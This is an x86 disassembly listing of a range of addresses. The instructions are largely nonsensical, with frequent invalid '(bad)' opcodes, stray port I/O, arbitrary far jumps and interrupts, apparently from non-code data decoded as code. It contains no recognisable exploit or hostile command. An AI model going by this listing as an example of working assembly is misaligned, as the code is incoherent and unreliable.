  415510:	ins    BYTE PTR es:[edi],dx
  415511:	sub    ecx,ebx
  415513:	add    ch,BYTE PTR [ebx+eax*1-0x55353f49]
  41551a:	cs in  al,dx
  41551c:	inc    esp
  41551d:	mov    ch,0x1f
  41551f:	push   cs
  415520:	fucomi st,st(7)
  415522:	jecxz  0x4154c0
  415524:	mov    esp,0xc02f0942
  415529:	mul    bl
  41552b:	shl    eax,1
  41552d:	inc    BYTE PTR [esi+0x5680d005]
  415533:	adc    cl,BYTE PTR [edx+0x6a]
  415536:	pop    ecx
  415537:	outs   dx,DWORD PTR ds:[esi]
  415538:	jno    0x415559
  41553a:	leave  
  41553b:	cmp    bh,0xcd
  41553e:	xchg   ebx,eax
  41553f:	repnz or ebp,DWORD PTR [eax]
  415542:	xchg   BYTE PTR ds:0x96d0819c,cl
  415548:	popf   
  415549:	push   esp
  41554a:	pusha  
  41554b:	test   DWORD PTR [edx-0x6790373],0xd4dcc057
  415555:	sbb    eax,0x8c57abe1
  41555a:	out    0x4d,al
  41555c:	sub    edx,DWORD PTR [ecx+0x6a3668bc]
  415562:	lods   eax,DWORD PTR ds:[esi]
  415563:	adc    dl,al
  415565:	and    dh,al
  415567:	popf   
  415568:	int    0xc9
  41556a:	xchg   esi,eax
  41556b:	pushf  
  41556c:	imul   esp,DWORD PTR [edi-0xa6594d8],0x12b220ab
  415576:	pushf  
  415577:	jg     0x41557a
  415579:	inc    BYTE PTR [esi+0x2cc221b]
  41557f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415580:	outs   dx,BYTE PTR ds:[esi]
  415581:	jb     0x415585
  415583:	xchg   ecx,eax
  415584:	aad    0xf
  415586:	lahf   
  415587:	mov    ch,0x6e
  415589:	je     0x41555c
  41558b:	inc    ecx
  41558c:	dec    BYTE PTR [edi]
  41558e:	push   ds
  41558f:	mov    edi,0xd028d15f
  415594:	(bad)  
  415595:	push   esi
  415596:	cld    
  415597:	lock inc edi
  415599:	pushf  
  41559a:	inc    DWORD PTR [edx+ebx*1+0x7b43c319]
  4155a1:	dec    esi
  4155a2:	mov    bh,0xa8
  4155a4:	div    BYTE PTR [edx-0x1f]
  4155a7:	xchg   ecx,eax
  4155a8:	xor    ebx,DWORD PTR [esp+esi*4]
  4155ab:	pop    ss
  4155ac:	xchg   BYTE PTR [ebx-0x80],bl
  4155af:	pop    edx
  4155b0:	hlt    
  4155b1:	sub    al,0x3
  4155b3:	out    0xa0,al
  4155b5:	pop    ss
  4155b6:	jo     0x41559c
  4155b8:	and    BYTE PTR [edi+esi*2-0x7d],dl
  4155bc:	int3   
  4155bd:	pop    ecx
  4155be:	add    BYTE PTR [eax],dl
  4155c0:	or     DWORD PTR [esi-0x1bad3435],edi
  4155c6:	mov    al,0x56
  4155c8:	call   0xf0e3967c
  4155cd:	sbb    ebp,DWORD PTR [esi+0x2c]
  4155d0:	out    0x7e,al
  4155d2:	in     eax,dx
  4155d3:	aam    0x4a
  4155d5:	push   edx
  4155d6:	xor    DWORD PTR [ebp+edi*2-0x20],ebp
  4155da:	mov    dh,0x51
  4155dc:	fstp   QWORD PTR ss:[edx+edx*8+0x5cd1e653]
  4155e4:	stc    
  4155e5:	or     BYTE PTR [eax],ah
  4155e7:	sub    edi,esp
  4155e9:	stc    
  4155ea:	inc    esi
  4155eb:	push   ds
  4155ec:	ins    BYTE PTR es:[edi],dx
  4155ed:	xchg   edi,eax
  4155ee:	iret   
  4155ef:	aas    
  4155f0:	dec    ecx
  4155f1:	or     dh,BYTE PTR [edi+eiz*2+0x6e]
  4155f5:	xchg   esp,eax
  4155f6:	and    esi,DWORD PTR [eax-0x13]
  4155f9:	sbb    DWORD PTR [edi-0x42337759],ebx
  4155ff:	dec    ebx
  415600:	or     eax,ecx
  415602:	xchg   ebp,eax
  415603:	push   esp
  415604:	jo     0x415595
  415606:	loope  0x415625
  415608:	sbb    edx,DWORD PTR [ebp-0x3d9a5a4d]
  41560e:	adc    DWORD PTR [eax+0x28d7178e],esi
  415614:	icebp  
  415615:	xchg   DWORD PTR [ecx-0x4d860d6e],esi
  41561b:	push   DWORD PTR [esi]
  41561d:	(bad)  
  41561e:	outs   dx,BYTE PTR ds:[esi]
  41561f:	mov    WORD PTR [ecx+0x7ff89cfc],cs
  415625:	inc    dx
  415627:	cli    
  415628:	mov    eax,0x64d5406d
  41562d:	jl     0x415613
  41562f:	mov    ecx,0x973239a3
  415634:	ret    
  415635:	adc    esi,DWORD PTR [edx]
  415637:	loopne 0x41568a
  415639:	pop    ss
  41563a:	jge    0x4156ac
  41563c:	in     al,dx
  41563d:	ficomp WORD PTR [ecx]
  41563f:	xchg   esi,eax
  415640:	pop    edi
  415641:	push   ebx
  415642:	push   0xffffffda
  415644:	lds    edx,FWORD PTR [eax+0x23]
  415647:	jnp    0x4155cf
  415649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41564a:	fcomp  QWORD PTR [esi]
  41564c:	mov    ch,0x7a
  41564e:	in     eax,0xc2
  415650:	out    dx,eax
  415651:	(bad)  
  415652:	hlt    
  415653:	int    0x37
  415655:	fnstcw WORD PTR [edi+eax*4]
  415658:	pop    ecx
  415659:	dec    ebp
  41565a:	shl    DWORD PTR [esi+0x2f1556dd],0x56
  415661:	adc    DWORD PTR [esi+0x2600fa09],edx
  415667:	(bad)  
  415668:	cdq    
  415669:	call   0x50c00968
  41566e:	mov    eax,0xd3c6851b
  415673:	(bad)  [edi-0x66715ed2]
  415679:	sbb    DWORD PTR [eax],ecx
  41567b:	jl     0x415677
  41567d:	xor    eax,0xeff6f1fc
  415682:	pop    edx
  415683:	faddp  st(4),st
  415685:	sbb    eax,0x821affe3
  41568a:	push   edi
  41568b:	retf   
  41568c:	stc    
  41568d:	add    eax,0xe9b709dc
  415692:	call   0x1b35c8a1
  415697:	enter  0x520d,0x6b
  41569b:	jecxz  0x4156aa
  41569d:	sub    eax,0x5ff5bd0d
  4156a2:	inc    edx
  4156a3:	loop   0x41568d
  4156a5:	pop    es
  4156a6:	stc    
  4156a7:	push   eax
  4156a8:	pop    edx
  4156a9:	(bad)  
  4156aa:	xlat   BYTE PTR ds:[ebx]
  4156ab:	jmp    0x4156ba
  4156ad:	(bad)  
  4156ae:	out    dx,al
  4156af:	push   0x6f7bda00
  4156b4:	shr    DWORD PTR [ebp+0x51ee71dd],0x47
  4156bb:	pop    esi
  4156bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156bd:	ins    BYTE PTR es:[edi],dx
  4156be:	dec    esi
  4156bf:	push   ebx
  4156c0:	inc    eax
  4156c1:	mov    edi,0x367809d8
  4156c6:	dec    ebx
  4156c7:	push   ds
  4156c8:	ja     0x41568e
  4156ca:	(bad)  
  4156cd:	or     esp,DWORD PTR [edx-0x79a768de]
  4156d3:	add    dl,BYTE PTR [edi]
  4156d5:	pop    ebp
  4156d6:	imul   esp,DWORD PTR [ecx-0x14acb190],0x40059492
  4156e0:	sbb    ch,dh
  4156e2:	lock dec esp
  4156e4:	clc    
  4156e5:	mov    edx,0x9b29ee78
  4156ea:	sbb    esi,DWORD PTR [ebx+0x15db1428]
  4156f0:	(bad)  
  4156f1:	jmp    0x3a2e:0x5f9e9f8c
  4156f8:	mov    bl,0xef
  4156fa:	cwde   
  4156fb:	cli    
  4156fc:	push   edi
  4156fd:	cmp    edx,eax
  4156ff:	sub    ch,BYTE PTR [edx+0x52d0c40f]
  415705:	mov    ebp,0x58c4653a
  41570a:	bound  esi,QWORD PTR [ebx-0x47]
  41570d:	mov    esi,0x84f155c2
  415712:	lds    esi,FWORD PTR [ebp-0x700d8851]
  415718:	inc    esp
  415719:	cmc    
  41571a:	ss adc al,0xcd
  41571d:	mov    esi,0xcc3744cc
  415722:	ja     0x4156fd
  415724:	or     BYTE PTR [ecx+0x16ec0440],0xe0
  41572b:	jecxz  0x415783
  41572d:	and    DWORD PTR [ebx],ebp
  41572f:	mov    ecx,0x763791a5
  415734:	or     ebp,DWORD PTR [ecx-0x54]
  415737:	and    BYTE PTR [edx+0x38bb7f67],dh
  41573d:	push   eax
  41573e:	ror    BYTE PTR [ecx],cl
  415740:	xor    eax,0xa5194691
  415745:	push   esi
  415746:	mov    gs,edi
  415748:	pop    ebp
  415749:	cs xor eax,0xb1c5d830
  41574f:	jmp    0x73b6:0xd18de71c
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	sub    al,0xe7
  415759:	pop    ebx
  41575a:	xor    al,0xe9
  41575c:	mov    ds:0x915a373f,eax
  415761:	jl     0x4157b4
  415763:	out    0x12,eax
  415765:	dec    ebp
  415766:	inc    eax
  415767:	pop    edx
  415768:	pushf  
  415769:	and    BYTE PTR [edx],0xdf
  41576c:	fisttp WORD PTR [ecx-0x1b]
  41576f:	jmp    0x4157c5
  415771:	pop    es
  415772:	xchg   ebp,eax
  415773:	push   ds
  415774:	loop   0x415772
  415776:	test   esp,esp
  415778:	mov    bh,0x4
  41577a:	mov    esp,0x60ac5c58
  41577f:	sbb    bl,bh
  415781:	dec    esi
  415782:	mov    cl,0x7d
  415784:	lds    ebx,FWORD PTR ss:[ebx]
  415787:	cli    
  415788:	xor    eax,0xb3854128
  41578d:	push   ecx
  41578e:	mov    esi,0xbc4ffc5a
  415793:	jge    0x415715
  415795:	shr    BYTE PTR [edx+0x5416fca1],1
  41579b:	xchg   esi,eax
  41579c:	pop    ebp
  41579d:	fnstsw WORD PTR [ecx+0x11]
  4157a0:	mov    eax,0x617b9e48
  4157a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157a6:	adc    eax,DWORD PTR [ecx]
  4157a8:	jge    0x4157e4
  4157aa:	daa    
  4157ab:	and    al,0x9e
  4157ad:	mov    al,ds:0xb2c4f4f
  4157b2:	scas   eax,DWORD PTR es:[edi]
  4157b3:	xor    DWORD PTR [esi],edi
  4157b5:	adc    ch,BYTE PTR [ebp-0x60c0fc44]
  4157bb:	add    esi,edx
  4157bd:	shl    BYTE PTR [ebx],cl
  4157bf:	sbb    eax,0x4e2a935
  4157c4:	inc    edi
  4157c5:	ins    BYTE PTR es:[edi],dx
  4157c6:	scas   al,BYTE PTR es:[edi]
  4157c7:	inc    edx
  4157c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157c9:	repnz push ecx
  4157cb:	add    ch,BYTE PTR [edi+eax*1+0x6bc7b2e]
  4157d2:	adc    edi,DWORD PTR [edi]
  4157d4:	hlt    
  4157d5:	popf   
  4157d6:	push   eax
  4157d7:	les    edi,FWORD PTR [eax-0x2a]
  4157da:	iret   
  4157db:	inc    eax
  4157dc:	in     al,0xc8
  4157de:	out    dx,al
  4157df:	(bad)  
  4157e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e1:	gs cmp al,0xb1
  4157e4:	mov    ds:0x4d70f14f,eax
  4157e9:	sub    BYTE PTR [ebp-0x42a58fd5],dl
  4157ef:	adc    DWORD PTR [edx+0x5],esp
  4157f2:	cli    
  4157f3:	jnp    0x4157c5
  4157f5:	cwde   
  4157f6:	icebp  
  4157f7:	fnstenv [ecx+0x5e2c130e]
  4157fd:	jae    0x41578d
  4157ff:	int3   
  415800:	dec    edx
  415801:	loope  0x41582b
  415803:	pop    edx
  415804:	xor    bl,BYTE PTR [esi-0x7d]
  415807:	rcl    DWORD PTR [edx+0x12e5e352],0x96
  41580e:	call   0xd5b79cae
  415813:	(bad)  
  415815:	and    al,0xe8
  415817:	loopne 0x4157f1
  415819:	out    dx,al
  41581a:	lods   al,BYTE PTR ds:[esi]
  41581b:	fmulp  st(1),st
  41581d:	fnstsw WORD PTR [eax-0x25917626]
  415823:	js     0x41583c
  415825:	rcr    DWORD PTR [edi],cl
  415827:	xchg   esp,eax
  415828:	push   eax
  415829:	pop    esi
  41582a:	fistp  QWORD PTR [edx+0x651a0336]
  415830:	xchg   ebx,eax
  415831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415832:	scas   eax,DWORD PTR es:[edi]
  415833:	rcl    DWORD PTR [ecx+0x129efca],cl
  415839:	call   0x6000:0x949950f0
  415840:	dec    eax
  415841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415842:	cwde   
  415843:	mov    ecx,0xf45f88e7
  415848:	jne    0x4157e6
  41584a:	lds    edi,FWORD PTR [edi+0x60fd922c]
  415850:	sbb    al,ah
  415852:	xor    eax,0x53135f96
  415857:	pusha  
  415858:	mov    BYTE PTR [edx],dh
  41585a:	sbb    ebp,DWORD PTR [edx-0x2968f503]
  415860:	adc    al,0x8
  415862:	cmp    eax,0x1fbcd978
  415867:	or     BYTE PTR [edi-0x3a3e4c03],al
  41586d:	cmc    
  41586e:	dec    BYTE PTR [ebx]
  415870:	mov    edi,0x6600034
  415875:	mov    WORD PTR [eax],gs
  415877:	test   BYTE PTR [edi-0x1fb516c5],bl
  41587d:	imul   BYTE PTR [ebx+0x6ea16ece]
  415883:	ds inc esi
  415885:	mov    ebp,0xbd7ce1f3
  41588a:	xor    DWORD PTR [ebp-0x22],ecx
  41588d:	and    edi,DWORD PTR ds:0x16e4760c
  415893:	sbb    bl,cl
  415895:	faddp  st(6),st
  415897:	test   eax,0x9033e509
  41589c:	daa    
  41589d:	in     al,0xc4
  41589f:	and    ebp,edi
  4158a1:	cld    
  4158a2:	shr    bl,1
  4158a4:	sbb    eax,0xeea35c1c
  4158a9:	jbe    0x41588c
  4158ab:	sbb    ebp,DWORD PTR [edx]
  4158ad:	rcl    BYTE PTR [esi],cl
  4158af:	xchg   edx,eax
  4158b0:	es (bad) 
  4158b2:	jmp    0xa1b2ffcf
  4158b7:	neg    DWORD PTR [eax+0x19f0082c]
  4158bd:	test   BYTE PTR [edx],ah
  4158bf:	pop    esp
  4158c0:	das    
  4158c1:	jmp    0x415852
  4158c3:	in     al,dx
  4158c4:	js     0x41586d
  4158c6:	scas   al,BYTE PTR es:[edi]
  4158c7:	jb     0x415897
  4158c9:	popf   
  4158ca:	ds mov eax,0x909d10c8
  4158d0:	je     0x4158b6
  4158d2:	mov    ds:0x4bb1e64f,eax
  4158d7:	pop    ds
  4158d8:	adc    dl,BYTE PTR [ecx]
  4158da:	call   0xc5ebe29a
  4158df:	cmp    al,0xa3
  4158e1:	mov    ?,WORD PTR [ecx-0x6c]
  4158e4:	sub    bl,BYTE PTR [ebx-0x44]
  4158e7:	sub    bh,BYTE PTR [esi]
  4158e9:	pop    esi
  4158ea:	test   al,0x4f
  4158ec:	cmp    cl,BYTE PTR [edi+0x65a3b462]
  4158f2:	dec    edx
  4158f3:	jp     0x4158df
  4158f5:	xor    BYTE PTR [ebx],dl
  4158f7:	or     esi,DWORD PTR [eax+edx*1+0x72209d16]
  4158fe:	xchg   BYTE PTR [eax],dl
  415900:	pop    esi
  415901:	out    dx,al
  415902:	push   0x5a8033bc
  415907:	xlat   BYTE PTR ds:[ebx]
  415908:	cmp    dh,BYTE PTR [ecx-0x688c242c]
  41590e:	shr    DWORD PTR [ecx+0x4f357c93],0x79
  415915:	mov    al,ds:0xe3bf93af
  41591a:	sbb    BYTE PTR [ebx],ch
  41591c:	iret   
  41591d:	add    cl,ah
  41591f:	outs   dx,DWORD PTR ds:[esi]
  415920:	mov    dl,0xf9
  415922:	dec    esi
  415923:	lock mov eax,ds:0x68643fce
  415929:	jmp    0x415926
  41592b:	mov    al,ds:0xf7b58918
  415930:	fadd   st,st(0)
  415932:	(bad)  
  415933:	xchg   ebx,eax
  415934:	js     0x4159b5
  415936:	je     0x4158b9
  415938:	and    edi,esi
  41593a:	mov    edi,0x83d4423b
  41593f:	mov    bh,0xde
  415941:	sbb    al,0xe6
  415943:	cmp    BYTE PTR [edi],bl
  415945:	push   esp
  415946:	dec    ebp
  415947:	outs   dx,BYTE PTR ds:[esi]
  415948:	fs push esi
  41594a:	xor    BYTE PTR [esi+0x462366d6],dh
  415950:	xor    edx,edx
  415952:	lods   al,BYTE PTR ds:[esi]
  415953:	lods   al,BYTE PTR ds:[esi]
  415954:	rol    BYTE PTR ds:0x6110ce78,cl
  41595a:	dec    esp
  41595b:	add    DWORD PTR [ecx-0x53c04d18],esi
  415961:	ss repnz dec ebx
  415964:	cld    
  415965:	mov    ds:0xb18d63b3,eax
  41596a:	fistp  WORD PTR [ebp+0x51]
  41596d:	in     eax,0xfe
  41596f:	adc    esi,DWORD PTR [ecx]
  415971:	test   DWORD PTR ds:0x31726ee1,0xc18c6138
  41597b:	push   ebp
  41597c:	fisttp QWORD PTR [eax-0x6a]
  41597f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415980:	push   esi
  415981:	cmp    BYTE PTR [edi+0x5527d298],dl
  415987:	and    bl,BYTE PTR [edi+0x3e]
  41598a:	mov    esp,DWORD PTR ds:0x29af9946
  415990:	add    BYTE PTR ds:0xdaab0dc7,0x35
  415997:	fstp   DWORD PTR [edi-0x34]
  41599a:	adc    BYTE PTR [edi+edx*1],bl
  41599d:	xor    ecx,DWORD PTR [edi+0x261d6ef0]
  4159a3:	js     0x4159b4
  4159a5:	sub    DWORD PTR [edx+0x2029b21f],eax
  4159ab:	jnp    0x4159fa
  4159ad:	dec    DWORD PTR [esi+0x44]
  4159b0:	xchg   ecx,eax
  4159b1:	adc    ebx,DWORD PTR [eax-0x2da8d413]
  4159b7:	sbb    DWORD PTR [esi],esi
  4159b9:	or     esp,DWORD PTR [edx+0x55]
  4159bc:	shl    BYTE PTR [eax+0x4a],cl
  4159bf:	pop    eax
  4159c0:	sar    ecx,0xd
  4159c3:	jo     0x415953
  4159c5:	sbb    ch,dh
  4159c7:	mov    ds:0x43afce02,al
  4159cc:	sub    al,0xc8
  4159ce:	pusha  
  4159cf:	adc    al,0x11
  4159d1:	cmp    eax,0x25e5f970
  4159d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159d7:	(bad)  
  4159d8:	push   edi
  4159d9:	in     al,dx
  4159da:	shr    BYTE PTR [eax-0x1e],1
  4159dd:	mov    bh,0x2f
  4159df:	jae    0x4159a4
  4159e1:	cld    
  4159e2:	loopne 0x41599c
  4159e4:	(bad)  [edi]
  4159e6:	inc    ecx
  4159e7:	xor    BYTE PTR [ebx+0x1f],0x37
  4159eb:	in     eax,0x97
  4159ed:	ror    DWORD PTR [edx],0xc8
  4159f0:	push   0xcea8f868
  4159f5:	xchg   ebp,eax
  4159f6:	hlt    
  4159f7:	in     al,0x3c
  4159f9:	jle    0x4159ca
  4159fb:	mov    eax,0x296de262
  415a00:	cwde   
  415a01:	mov    cl,0xec
  415a03:	mov    edi,0x37b8ac64
  415a08:	arpl   WORD PTR [edx-0x5e814bdc],sp
  415a0e:	cmp    DWORD PTR [eax-0x6a],0x5d0fc08a
  415a15:	jae    0x415a4d
  415a17:	(bad)  
  415a18:	push   eax
  415a19:	fild   QWORD PTR [ebx-0xd]
  415a1c:	cmp    esi,DWORD PTR [ebp+0x1e]
  415a1f:	loopne 0x415a8b
  415a21:	mov    esp,0xc0b10dec
  415a26:	add    DWORD PTR [ebx+esi*2-0x71388e58],ebx
  415a2d:	xor    DWORD PTR [ebp+0x6ddb3fd9],0x2554384
  415a37:	test   al,0x84
  415a39:	xchg   ebp,eax
  415a3a:	pushf  
  415a3b:	dec    esp
  415a3c:	dec    esi
  415a3d:	scas   al,BYTE PTR es:[edi]
  415a3e:	dec    ebp
  415a3f:	push   ecx
  415a40:	jecxz  0x415a43
  415a42:	mov    al,ds:0x2fa0abb
  415a47:	lock xchg edi,eax
  415a49:	retf   0xeb17
  415a4c:	inc    edi
  415a4d:	retf   
  415a4e:	out    dx,al
  415a4f:	inc    edx
  415a50:	stc    
  415a51:	dec    eax
  415a52:	int    0x48
  415a54:	ret    0x194f
  415a57:	cmp    bh,ah
  415a59:	xchg   ecx,eax
  415a5a:	mov    esi,0x7cd2b232
  415a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a60:	add    edi,DWORD PTR [esi-0x7ef5942e]
  415a66:	mov    dl,0xe9
  415a68:	or     eax,0x1f9838cc
  415a6d:	sub    BYTE PTR ds:0xd8f0ab90,ch
  415a73:	jae    0x415ace
  415a75:	mov    gs,WORD PTR [ebp+0x63e4aae]
  415a7b:	mov    dh,0x13
  415a7d:	adc    al,0xb7
  415a7f:	ins    DWORD PTR es:[edi],dx
  415a80:	jno    0x415a4f
  415a82:	cdq    
  415a83:	push   ebp
  415a84:	sahf   
  415a85:	addr16 push es
  415a87:	inc    ecx
  415a88:	jns    0x415a75
  415a8a:	retf   0xc57f
  415a8d:	hlt    
  415a8e:	jae    0x415a89
  415a90:	stos   BYTE PTR es:[edi],al
  415a91:	lahf   
  415a92:	loope  0x415af3
  415a94:	outs   dx,DWORD PTR ds:[esi]
  415a95:	pop    ds
  415a96:	mov    eax,DWORD PTR [ecx-0x43]
  415a99:	mov    ah,al
  415a9b:	or     DWORD PTR [ebp-0x2a],edi
  415a9e:	mov    ebp,0xb6d4adcd
  415aa3:	das    
  415aa4:	lods   al,BYTE PTR ds:[esi]
  415aa5:	nop
  415aa6:	(bad)  
  415aa8:	jmp    0x9b77:0x4521d09e
  415aaf:	dec    eax
  415ab0:	daa    
  415ab1:	imul   eax,DWORD PTR [ebx+0x4e0f48b1],0x62fbab0
  415abb:	and    eax,0x459f5c59
  415ac0:	(bad)
  415ac4:	fwait
  415ac5:	add    DWORD PTR ds:0xf0dda881,eax
  415acb:	push   es
  415acc:	sub    bl,BYTE PTR [esi-0x48b33499]
  415ad2:	or     al,0xdc
  415ad4:	mov    ds:0xdd1f26a8,al
  415ad9:	dec    esp
  415ada:	call   0x76a622e0
  415adf:	call   0xfcaa:0xd48639ef
  415ae6:	mov    ah,BYTE PTR ds:0x543af96
  415aec:	mov    edi,0xbf474c08
  415af1:	and    esi,DWORD PTR [ebp+0x6ff73ae4]
  415af7:	in     eax,0xac
  415af9:	ret    
  415afa:	lea    ebx,[ebx]
  415afc:	mov    dl,dh
  415afe:	xchg   edx,eax
  415aff:	xchg   ebp,eax
  415b00:	es dec esi
  415b02:	nop
  415b03:	rol    al,0xd8
  415b06:	push   ebp
  415b07:	pop    esp
  415b08:	in     eax,0xf2
  415b0a:	push   es
  415b0b:	(bad)  
  415b0c:	jne    0x415ad2
  415b0e:	or     DWORD PTR [ecx-0x67],0xfffffff9
  415b12:	sbb    eax,0x39b5b2d0
  415b17:	test   al,0xa2
  415b19:	mov    al,0x59
  415b1b:	retf   0xaece
  415b1e:	or     eax,0x7dedf4fe
  415b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b24:	std    
  415b25:	pop    esi
  415b26:	and    eax,0xa36f4bfa
  415b2b:	(bad)  [ecx+0x7aee654a]
  415b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b32:	inc    ebp
  415b33:	cdq    
  415b34:	xchg   edx,eax
  415b35:	cld    
  415b36:	push   edi
  415b37:	mov    cl,0x33
  415b39:	inc    ecx
  415b3a:	test   ecx,eax
  415b3c:	mov    bl,0x91
  415b3e:	jp     0x415ae0
  415b40:	push   ds
  415b41:	xor    ch,cl
  415b43:	push   esp
  415b44:	inc    ecx
  415b45:	lahf   
  415b46:	push   eax
  415b47:	push   cs
  415b48:	loop   0x415af6
  415b4a:	ss out 0x18,al
  415b4d:	retf   
  415b4e:	cs fwait
  415b50:	push   ds
  415b51:	cmc    
  415b52:	cmc    
  415b53:	pop    ss
  415b54:	test   DWORD PTR [ecx-0x55],eax
  415b57:	jmp    0x415b0d
  415b59:	jne    0x415b0f
  415b5b:	pop    edx
  415b5c:	mov    eax,0x48e28966
  415b61:	adc    eax,0x56bbc57
  415b66:	mov    edx,0xfea0e70b
  415b6b:	ret    0x6abe
  415b6e:	push   edi
  415b6f:	sub    eax,0xd55db653
  415b74:	(bad)  
  415b76:	out    dx,al
  415b77:	mov    bh,0xd0
  415b79:	enter  0xac4b,0x93
  415b7d:	aaa    
  415b7e:	mov    dl,0xd1
  415b80:	int3   
  415b81:	aas    
  415b82:	test   esp,edx
  415b84:	dec    edi
  415b85:	ins    BYTE PTR es:[edi],dx
  415b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b87:	shl    BYTE PTR [ebx+ebx*8],1
  415b8a:	iret   
  415b8b:	into   
  415b8c:	out    dx,eax
  415b8d:	fcmovne st,st(1)
  415b8f:	adc    al,0x46
  415b91:	mov    ebp,0xae59c610
  415b96:	jno    0x415b5e
  415b98:	mov    esi,0xf7baa9e
  415b9d:	sbb    DWORD PTR ds:0xa981148d,esp
  415ba3:	fsubr  QWORD PTR [eax+0x7b1e09a6]
  415ba9:	pop    esp
  415baa:	repz xor BYTE PTR [ecx+ecx*2],0xf
  415baf:	dec    esp
  415bb0:	aaa    
  415bb1:	xchg   edx,eax
  415bb2:	(bad)  
  415bb3:	int3   
  415bb4:	jbe    0x415b58
  415bb6:	adc    al,0x4b
  415bb8:	adc    eax,0xbd1dea8a
  415bbd:	pop    edx
  415bbe:	and    BYTE PTR [edx+0x6aecc4bb],al
  415bc4:	(bad)  
  415bc5:	dec    eax
  415bc6:	outs   dx,BYTE PTR ds:[esi]
  415bc7:	jecxz  0x415c14
  415bc9:	cld    
  415bca:	and    esp,DWORD PTR [edi-0x3b]
  415bcd:	jmp    0x2e74:0x2443d744
  415bd4:	add    DWORD PTR [eax-0x6b],ebp
  415bd7:	sub    DWORD PTR [edx+0x67370595],0xe9b228ee
  415be1:	inc    esp
  415be2:	pop    esi
  415be3:	(bad)  
  415be4:	and    bl,bl
  415be6:	retf   0x23e1
  415be9:	xchg   esp,eax
  415bea:	std    
  415beb:	pop    ss
  415bec:	fcom   QWORD PTR [esi-0x55f09719]
  415bf2:	inc    ecx
  415bf3:	jae    0x415bc9
  415bf5:	xlat   BYTE PTR ds:[ebx]
  415bf6:	out    dx,eax
  415bf7:	fsubrp st(7),st
  415bf9:	rcr    BYTE PTR [edi+ebp*2],1
  415bfc:	sub    edi,ebx
  415bfe:	std    
  415bff:	inc    esp
  415c00:	push   edi
  415c01:	jmp    0x208ab515
  415c06:	and    ch,ah
  415c08:	inc    edx
  415c09:	inc    ebp
  415c0a:	xchg   ebp,eax
  415c0b:	jbe    0x415ba9
  415c0d:	push   esi
  415c0e:	jo     0x415be7
  415c10:	add    bl,cl
  415c12:	out    0xfa,al
  415c14:	jno    0x415bb1
  415c16:	mov    WORD PTR [eax+edx*2+0x4d],fs
  415c1a:	adc    BYTE PTR [esi],dh
  415c1c:	test   BYTE PTR [edx],ah
  415c1e:	xchg   edi,eax
  415c1f:	js     0x415c55
  415c21:	mov    esi,0x62bfcfe6
  415c26:	jnp    0x415c23
  415c28:	or     BYTE PTR [ecx-0x1e],dl
  415c2b:	sub    al,0x0
  415c2d:	fiadd  WORD PTR [ebx]
  415c2f:	retf   0xc14f
  415c32:	or     BYTE PTR [edi-0x123ed721],0x5c
  415c39:	jno    0x415c5a
  415c3b:	xchg   BYTE PTR [ecx],ah
  415c3d:	dec    esi
  415c3e:	dec    edx
  415c3f:	push   esi
  415c40:	mov    ecx,0xf8fa5803
  415c45:	clc    
  415c46:	shrd   DWORD PTR [esi+ebx*4-0x7b],eax,0xc9
  415c4c:	pop    ebx
  415c4d:	aad    0x8d
  415c4f:	fimul  DWORD PTR [edi]
  415c51:	ins    BYTE PTR es:[edi],dx
  415c52:	xlat   BYTE PTR ds:[ebx]
  415c53:	mov    dh,0xe1
  415c55:	cmp    cl,BYTE PTR [ebx+0x45]
  415c58:	ds mov ecx,0xd2835a19
  415c5e:	loop   0x415c55
  415c60:	test   dh,dl
  415c62:	sbb    al,0x83
  415c64:	jno    0x415c71
  415c66:	push   es
  415c67:	pop    edx
  415c68:	shl    BYTE PTR [edx-0x59],cl
  415c6b:	mov    dl,0xf7
  415c6d:	pop    ecx
  415c6e:	cmp    DWORD PTR [ebp+ecx*1-0x5e],ebp
  415c72:	shl    BYTE PTR [eax-0x74],cl
  415c75:	rcl    BYTE PTR [edx+0x38dd9764],cl
  415c7b:	loop   0x415c6e
  415c7d:	ins    DWORD PTR es:[edi],dx
  415c7e:	dec    edx
  415c7f:	and    al,0xc7
  415c81:	add    al,0x30
  415c83:	retf   0x1e52
  415c86:	lahf   
  415c87:	lods   eax,DWORD PTR ds:[esi]
  415c88:	xchg   ecx,eax
  415c89:	jl     0x415c8f
  415c8b:	pop    esi
  415c8c:	out    dx,al
  415c8d:	dec    edi
  415c8e:	cmp    esp,DWORD PTR ds:0x4fb5ea95
  415c94:	add    eax,0xf9025160
  415c99:	xchg   ebx,eax
  415c9a:	sub    al,0xaf
  415c9c:	daa    
  415c9d:	(bad)  
  415c9e:	clc    
  415c9f:	std    
  415ca0:	add    al,BYTE PTR [ebp+0x5dc4b50c]
  415ca6:	push   esi
  415ca7:	loop   0x415c5a
  415ca9:	add    BYTE PTR [esi+0x6c],ah
  415cac:	xchg   ebp,eax
  415cad:	inc    esp
  415cae:	push   cs
  415caf:	ds pop eax
  415cb1:	ror    DWORD PTR ds:0xa75b0d32,1
  415cb7:	adc    al,BYTE PTR [esi]
  415cb9:	xchg   DWORD PTR [esi+0x78c6d3d7],ebp
  415cbf:	adc    BYTE PTR [esi+0x49],dl
  415cc2:	xlat   BYTE PTR ds:[ebx]
  415cc3:	mov    edx,0x89311732
  415cc8:	popa   
  415cc9:	ins    DWORD PTR es:[edi],dx
  415cca:	outs   dx,BYTE PTR ds:[esi]
  415ccb:	inc    edx
  415ccc:	pop    es
  415ccd:	sub    ecx,DWORD PTR [ecx-0x9]
  415cd0:	retf   0x3af2
  415cd3:	jmp    0x3173:0x84a6329
  415cda:	neg    DWORD PTR [eax+ebp*8+0x3c81f143]
  415ce1:	add    al,0xc6
